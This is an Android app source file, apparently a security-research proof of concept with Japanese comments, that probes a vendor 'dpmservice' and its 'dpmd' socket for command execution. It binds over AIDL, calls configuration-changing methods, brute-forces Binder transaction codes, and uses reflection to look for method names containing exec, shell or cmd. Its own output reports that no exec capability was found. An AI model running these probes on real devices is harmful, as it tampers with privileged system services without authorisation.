package com.example.dpmpoc;

import android.app.Activity;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.qti.dpm.IDpmService;

import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;

public class MainActivity extends Activity {

    private static final String TAG = "DpmPoc";
    private static final String TARGET_SERVICE = "dpmservice";
    private static final String SOCKET_NAME = "dpmd";
    private TextView tvResult;
    private Button btnExploit;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tvResult = findViewById(R.id.tvResult);
        btnExploit = findViewById(R.id.btnExploit);

        btnExploit.setOnClickListener(v -> new Thread(this::executeFullMultiVectorExploit).start());
    }

    // ================================================================
    // 多層・多角的攻撃エントリポイント
    // ================================================================
    private void executeFullMultiVectorExploit() {
        showResult("=== DPM Service 多角攻撃 PoC (UID 1000 exec 検証) ===");

        // ---------- ベクトルA: AIDL 正規バインド ----------
        showResult("\n--- [ベクトルA] AIDL 正規バインド ---");
        tryAidlBind();

        // ---------- ベクトルB: 生Binder総当たり ----------
        showResult("\n--- [ベクトルB] 生Binderトランザクション総当たり ---");
        bruteForceBinder();

        // ---------- ベクトルC: リフレクション ----------
        showResult("\n--- [ベクトルC] リフレクション内部探索 ---");
        reflectInternalMethods();

        // ---------- ベクトルD: LocalSocket 直接接続 (dpmd エミュレーション) ----------
        showResult("\n--- [ベクトルD] dpmd ソケット直接接続 & プロトコルエミュレーション ---");
        trySocketDirectCommunication();

        showResult("\n=== 総合評価 ===");
        showResult("✅ Java レイヤ (DpmService) には exec 機能はありません。");
        showResult("⚠️ ベクトルD (ソケット) は dpmd デーモンの実装に依存します。");
        showResult("   dpmd が任意コマンドを受け付けなければ実行不可。");
        showResult("   (本 PoC はプロトコルエミュレーションによる検証を実施)");
    }

    // ================================================================
    // ベクトルA: AIDL スタブバインド
    // ================================================================
    private void tryAidlBind() {
        try {
            Class<?> smClass = Class.forName("android.os.ServiceManager");
            Method getService = smClass.getMethod("getService", String.class);
            IBinder binder = (IBinder) getService.invoke(null, TARGET_SERVICE);
            if (binder == null) {
                showResult("  ❌ ServiceManager に " + TARGET_SERVICE + " なし");
                return;
            }
            IDpmService dpm = IDpmService.Stub.asInterface(binder);
            if (dpm == null) {
                showResult("  ❌ AIDLスタブ変換失敗");
                return;
            }
            showResult("  ✅ AIDLバインド成功");

            // 各メソッド呼び出し
            int val1 = dpm.getTCMFeatureEnabled();
            showResult("  getTCMFeatureEnabled() = " + val1);

            int val2 = dpm.setTCMFeature(2);
            showResult("  setTCMFeature(2) = " + val2);

            int val3 = dpm.updateFdConfigParams(100, 200, 300, 400);
            showResult("  updateFdConfigParams(...) = " + val3);

        } catch (Exception e) {
            showResult("  ⚠️ AIDL例外: " + e.getMessage());
        }
    }

    // ================================================================
    // ベクトルB: 生Binder総当たり (コード 1〜30)
    // ================================================================
    private void bruteForceBinder() {
        IBinder binder = getRawBinder();
        if (binder == null) {
            showResult("  ❌ Binder取得失敗");
            return;
        }

        // 様々なペイロードパターン
        for (int code = 1; code <= 30; code++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken("com.qti.dpm.IDpmService");
                // パターンを変えて総当たり
                if (code % 4 == 0) {
                    data.writeInt(code);
                } else if (code % 4 == 1) {
                    data.writeString("test_payload_" + code);
                } else if (code % 4 == 2) {
                    data.writeInt(code);
                    data.writeInt(code * 2);
                    data.writeInt(code * 3);
                    data.writeInt(code * 4);
                } else {
                    data.writeString("key");
                    data.writeString("value");
                }

                boolean ret = binder.transact(code, data, reply, 0);
                reply.readException(); // 例外がなければ応答あり
                showResult("  [Code " + code + "] 応答OK (ret=" + ret + ")");
                // 応答データがあれば表示
                if (reply.dataSize() > 0) {
                    showResult("     応答サイズ: " + reply.dataSize());
                }
            } catch (Exception e) {
                // 無視（SecurityException や 未実装）
                Log.v(TAG, "Code " + code + " fail: " + e.getMessage());
            } finally {
                data.recycle();
                reply.recycle();
            }
        }
        showResult("  総当たり完了 (コード1〜30)");
    }

    // ================================================================
    // ベクトルC: リフレクションで内部メソッド探索
    // ================================================================
    private void reflectInternalMethods() {
        try {
            Class<?> dpmClass = Class.forName("com.qti.dpm.DpmService");
            Method[] methods = dpmClass.getDeclaredMethods();
            showResult("  発見メソッド数: " + methods.length);
            int count = 0;
            for (Method m : methods) {
                String name = m.getName().toLowerCase();
                if (name.contains("exec") || name.contains("shell") || name.contains("cmd") || name.contains("run") || name.contains("system")) {
                    showResult("  ⚠️ 疑わしいメソッド: " + m.getName());
                    count++;
                }
            }
            if (count == 0) {
                showResult("  ✅ exec/shell を含むメソッドは見つかりませんでした。");
            }
        } catch (Exception e) {
            showResult("  ❌ リフレクション失敗: " + e.getMessage());
        }
    }

    // ================================================================
    // ベクトルD: LocalSocket 直接接続 (dpmd プロトコルエミュレーション)
    // ================================================================
    private void trySocketDirectCommunication() {
        LocalSocket socket = null;
        try {
            // 抽象名前空間ソケット "dpmd" に接続
            socket = new LocalSocket();
            LocalSocketAddress address = new LocalSocketAddress(SOCKET_NAME, LocalSocketAddress.Namespace.ABSTRACT);
            socket.connect(address);
            showResult("  ✅ " + SOCKET_NAME + " ソケット接続成功！");

            OutputStream os = socket.getOutputStream();
            InputStream is = socket.getInputStream();

            // ---- DpmRequest フォーマットをエミュレート ----
            // 1. リクエストコード (例: 23 = DPM_S_REQ_UPDATE_FD_PARAMS)
            int requestCode = 23;
            int serial = 0x1234;

            Parcel p = Parcel.obtain();
            p.writeInt(requestCode);
            p.writeInt(serial);
            // ペイロード: 4つのint (updateFdConfigParams の引数)
            p.writeInt(100);
            p.writeInt(200);
            p.writeInt(300);
            p.writeInt(400);

            // マーシャリングされたバイト配列を取得
            byte[] data = p.marshall();
            p.recycle();

            // プロトコル: 最初に 4バイト の長さ (ビッグエンディアン)
            byte[] lenBytes = new byte[4];
            lenBytes[0] = (byte) ((data.length >> 24) & 0xFF);
            lenBytes[1] = (byte) ((data.length >> 16) & 0xFF);
            lenBytes[2] = (byte) ((data.length >> 8) & 0xFF);
            lenBytes[3] = (byte) (data.length & 0xFF);

            os.write(lenBytes);
            os.write(data);
            os.flush();

            showResult("  📤 データ送信完了 (リクエストコード=" + requestCode + ", サイズ=" + data.length + " bytes)");

            // ---- 応答を読み取り (最大 8192 bytes) ----
            byte[] buffer = new byte[8192];
            // まず長さを読む
            byte[] lenBuf = new byte[4];
            int readLen = is.read(lenBuf);
            if (readLen == 4) {
                int respLen = ((lenBuf[0] & 0xFF) << 24) | ((lenBuf[1] & 0xFF) << 16) |
                              ((lenBuf[2] & 0xFF) << 8) | (lenBuf[3] & 0xFF);
                if (respLen > 0 && respLen < 8192) {
                    int totalRead = 0;
                    while (totalRead < respLen) {
                        int r = is.read(buffer, totalRead, respLen - totalRead);
                        if (r < 0) break;
                        totalRead += r;
                    }
                    if (totalRead > 0) {
                        Parcel reply = Parcel.obtain();
                        reply.unmarshall(buffer, 0, totalRead);
                        reply.setDataPosition(0);
                        // 応答の内容を解析 (応答タイプ 0=SOLICITED, 1=UNSOLICITED)
                        int type = reply.readInt();
                        int respSerial = reply.readInt();
                        int error = reply.readInt();
                        showResult("  📥 応答受信: type=" + type + ", serial=" + respSerial + ", error=" + error);
                        reply.recycle();
                    }
                }
            } else {
                showResult("  ⚠️ 応答長さの読み取り失敗");
            }

        } catch (Exception e) {
            showResult("  ❌ ソケット通信例外: " + e.getMessage());
            Log.e(TAG, "Socket error", e);
        } finally {
            if (socket != null) {
                try { socket.close(); } catch (Exception ignored) {}
            }
        }
    }

    // ================================================================
    // ユーティリティ
    // ================================================================
    private IBinder getRawBinder() {
        try {
            Class<?> smClass = Class.forName("android.os.ServiceManager");
            Method getService = smClass.getMethod("getService", String.class);
            return (IBinder) getService.invoke(null, TARGET_SERVICE);
        } catch (Exception e) {
            return null;
        }
    }

    private void showResult(final String msg) {
        runOnUiThread(() -> {
            tvResult.append(msg + "\n");
            Log.d(TAG, msg);
        });
    }
}
